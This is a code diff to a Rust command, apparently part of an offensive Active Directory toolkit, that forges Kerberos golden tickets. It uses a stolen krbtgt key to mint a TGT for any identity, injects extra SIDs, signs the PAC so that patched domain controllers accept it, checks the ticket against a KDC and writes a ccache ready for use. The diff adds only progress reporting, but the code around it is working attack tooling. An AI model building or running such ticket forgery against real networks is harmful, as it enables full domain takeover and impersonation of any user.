@@ -1,6 +1,7 @@
 //! Golden ticket: forge a TGT for any identity with the krbtgt AES256 key.
 //! Sealed + double-signed so fully-patched (KB5020805) KDCs still accept it.
 
+use crate::ui;
 use anyhow::{Context, Result};
 use clap::Parser;
 
@@ -48,10 +49,48 @@ pub(crate) struct GoldenArgs {
 /// Golden ticket: forge a TGT for an arbitrary identity, sealed + double-signed with the domain's
 /// krbtgt AES256 key. Accepted by fully-patched (KB5020805) KDCs because the forged PAC carries a
 /// valid KDC signature plus PAC_REQUESTOR/PAC_ATTRIBUTES.
+///
+/// Wraps `golden_impl` with a per-stage checklist so the run-end card breaks the operation into
+/// distinct phases (key parse → SID parse → foreign SID parse → forge → verify → write ccache).
 pub(crate) async fn golden(a: GoldenArgs) -> Result<()> {
+    let mut checklist = ui::StageChecklist::new([
+        "parse krbtgt key",
+        "parse domain SID",
+        "parse foreign SIDs (ExtraSids)",
+        "forge golden TGT",
+        "verify with KDC (--verify-spn)",
+        "write ccache",
+    ]);
+    let result = golden_impl(a, &mut checklist).await;
+    match &result {
+        Ok(()) => checklist.render("Golden stages"),
+        Err(e) => {
+            let brief = format!("{e:#}")
+                .lines()
+                .next()
+                .unwrap_or("failed")
+                .chars()
+                .take(80)
+                .collect::<String>();
+            checklist.mark_current_failed(brief);
+            checklist.render("Golden stages (failed)");
+        }
+    }
+    result
+}
+
+async fn golden_impl(a: GoldenArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
     use adhammer_kerberos::pac::ForgeIdentity;
 
     let key = crate::parse_forge_key(&a.krbtgt_aes256, a.rc4)?;
+    checklist.record_ok(
+        "parse krbtgt key",
+        if a.rc4 {
+            "RC4-HMAC (NT hash)"
+        } else {
+            "AES256-CTS-HMAC-SHA1-96"
+        },
+    );
     let subs: Vec<u32> = a
         .domain_sid
         .trim_start_matches("S-1-5-")
@@ -59,6 +98,7 @@ pub(crate) async fn golden(a: GoldenArgs) -> Result<()> {
         .map(|x| x.parse::<u32>())
         .collect::<std::result::Result<_, _>>()
         .context("--domain-sid must be S-1-5-21-a-b-c")?;
+    checklist.record_ok("parse domain SID", format!("→ {}", a.domain_sid));
 
     // Parse --foreign-sid values into sub-authority chains for the PAC's ExtraSids.
     // Only identifier authority 5 (NT_AUTHORITY) is meaningful in KERB_VALIDATION_INFO
@@ -96,8 +136,18 @@ pub(crate) async fn golden(a: GoldenArgs) -> Result<()> {
         for s in &a.foreign_sid {
             println!("    {s}");
         }
+        checklist.record_ok(
+            "parse foreign SIDs (ExtraSids)",
+            format!("{} SID(s) injected", a.foreign_sid.len()),
+        );
+    } else {
+        checklist.record_ok("parse foreign SIDs (ExtraSids)", "none");
     }
     let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
+    checklist.record_ok(
+        "forge golden TGT",
+        format!("{}@{} (rid {})", a.user, a.realm, a.rid),
+    );
     println!(
         "[+] forged golden TGT: {}@{} (rid {}, groups {:?})",
         a.user, a.realm, a.rid, a.groups
@@ -105,17 +155,37 @@ pub(crate) async fn golden(a: GoldenArgs) -> Result<()> {
 
     if let Some(spn) = &a.verify_spn {
         match adhammer_kerberos::roast_spn(&tgt, &a.user, spn, &a.kdc).await {
-            Ok(_) => println!("[+] KDC accepted the golden ticket (TGS-REP for {spn})"),
-            Err(e) => println!("[-] KDC rejected the golden ticket for {spn}: {e}"),
+            Ok(_) => {
+                checklist.record_ok(
+                    "verify with KDC (--verify-spn)",
+                    format!("KDC accepted for {spn}"),
+                );
+                println!("[+] KDC accepted the golden ticket (TGS-REP for {spn})");
+            }
+            Err(e) => {
+                checklist.record_ok(
+                    "verify with KDC (--verify-spn)",
+                    format!("KDC rejected for {spn}: {e}"),
+                );
+                println!("[-] KDC rejected the golden ticket for {spn}: {e}");
+            }
         }
+    } else {
+        checklist.record_ok(
+            "verify with KDC (--verify-spn)",
+            "skipped (no --verify-spn)",
+        );
     }
     if let Some(out) = &a.out {
         let cc = adhammer_kerberos::golden_ccache(&tgt, &a.user)?;
         std::fs::write(out, &cc)?;
+        checklist.record_ok("write ccache", format!("→ {out} ({} bytes)", cc.len()));
         println!(
             "[+] wrote ccache → {out} ({} bytes). Use: KRB5CCNAME={out}",
             cc.len()
         );
+    } else {
+        checklist.record_ok("write ccache", "skipped (no --out)");
     }
     Ok(())
 }
